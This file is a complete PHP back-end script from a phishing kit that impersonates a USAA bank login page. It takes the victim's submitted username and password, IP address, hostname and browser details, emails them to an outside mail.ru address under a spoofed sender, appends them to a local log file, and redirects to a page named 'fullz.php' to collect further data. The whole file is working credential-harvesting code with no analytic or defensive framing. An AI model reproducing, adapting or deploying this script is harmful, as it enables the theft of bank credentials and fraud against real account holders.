<?php
$ip = getenv("REMOTE_ADDR");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

$message  = "========+[ USAA Login ]+=========\n";
$message .= "Username : ".$_POST['userid']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "HostName : ".$hostname."\n";

$message .= "Browser Details : ".$user_agent."\n";
$send = "gerasimovaveroniya6419@mail.ru";
$subject = "USAA Logs | $ip";
$headers = "From: Comct  <legit@mrmoz.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
$fp = fopen("../sn3.txt","a");
fputs($fp,$message);
fclose($fp); 
header("Location: fullz.php");
?>